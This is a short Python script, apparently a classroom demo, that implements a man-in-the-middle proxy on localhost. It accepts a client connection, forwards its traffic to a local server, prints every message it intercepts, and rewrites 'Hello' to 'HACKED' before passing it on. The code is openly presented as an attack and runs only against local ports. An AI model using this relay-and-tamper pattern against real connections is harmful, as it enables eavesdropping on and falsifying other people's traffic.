import socket # Import socket module for network communication
def mitm_attack():
    # Create a TCP socket for the MITM proxy
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind the socket to localhost on port 8888 (MITM acts as a fake server)
    mitm_socket.bind(('localhost', 8888))
    # Start listening for incoming client connections
    mitm_socket.listen(1)
    print("MITM waiting for connections...")
    client_conn, client_addr = mitm_socket.accept()
    print(f"Intercepting connection from {client_addr}")
    # Create a new socket to connect to the real server (MITM forwards traffic)
    real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    real_server_socket.connect(('localhost', 9999)) # Connect to the actual server

    while True:
        # Receive data from the client
        client_data = client_conn.recv(1024)
        if not client_data:
            break # Exit if no data is received (client disconnected)
        print(f"[MITM] Intercepted from Client: {client_data.decode()}")
        # Modify the message (optional: here, replacing "Hello" with "HACKED")
        manipulated_data = client_data.decode().replace("Hello", "HACKED")
        # Send modified data to the real server
        real_server_socket.send(manipulated_data.encode())
        # Receive the server's response
        server_response = real_server_socket.recv(1024)
        print(f"[MITM] Intercepted from Server: {server_response.decode()}")
        # Forward the server's response back to the client
        client_conn.send(server_response)

    client_conn.close()
    real_server_socket.close()
    mitm_socket.close()
mitm_attack()